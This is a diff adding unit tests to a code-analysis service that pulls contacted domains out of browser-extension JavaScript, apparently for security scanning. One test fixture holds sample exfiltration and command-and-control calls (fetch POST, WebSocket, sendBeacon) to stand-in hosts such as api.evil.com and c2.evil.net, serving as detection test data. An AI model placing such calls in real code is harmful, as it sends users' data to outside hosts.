@@ -151,4 +151,57 @@ describe('AstParserService', () => {
       expect(selectors).toEqual([]);
     });
   });
+
+  describe('extractContactedDomains — context-aware', () => {
+    it('does NOT extract domains from window.open (it is a link, not a contact)', () => {
+      const code = `
+        document.getElementById("ins").addEventListener("click", function () {
+          window.open("https://www.instagram.com/get_happy_dog/", "_blank");
+        });
+        document.getElementById("dc").addEventListener("click", function () {
+          window.open("https://discord.gg/AaqgxTJzXk", "_blank");
+        });
+      `;
+      const domains = service.extractContactedDomains(code, 'popup.js');
+      expect(domains).toEqual([]);
+    });
+
+    it('does NOT extract domains from chrome.tabs.create or location.href', () => {
+      const code = `
+        chrome.tabs.create({ url: "https://example.com/page" });
+        location.href = "https://other.com/foo";
+      `;
+      const domains = service.extractContactedDomains(code, 'bg.js');
+      expect(domains).toEqual([]);
+    });
+
+    it('extracts hosts that are real network-sink arguments', () => {
+      const code = `
+        await fetch("https://api.evil.com/exfil", { method: "POST" });
+        new WebSocket("wss://c2.evil.net/socket");
+        navigator.sendBeacon("https://beacon.evil.org/p");
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'bg.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('api.evil.com');
+      expect(domains).toContain('c2.evil.net');
+      expect(domains).toContain('beacon.evil.org');
+    });
+
+    it('handles template literals and concatenation in fetch args', () => {
+      const code = `
+        const host = "api.example.com";
+        fetch(\`https://\${host}/v1/data\`);
+        fetch("https://" + "other.com" + "/x");
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'bg.js')
+        .map((d) => d.domain);
+      // Template literal: the quasi prefix "https://" -> host parsed from it
+      // when joined; concatenation: "https://other.com/x" is parsed.
+      expect(domains.length).toBeGreaterThan(0);
+      expect(domains.some((d) => d === 'other.com')).toBe(true);
+    });
+  });
 });
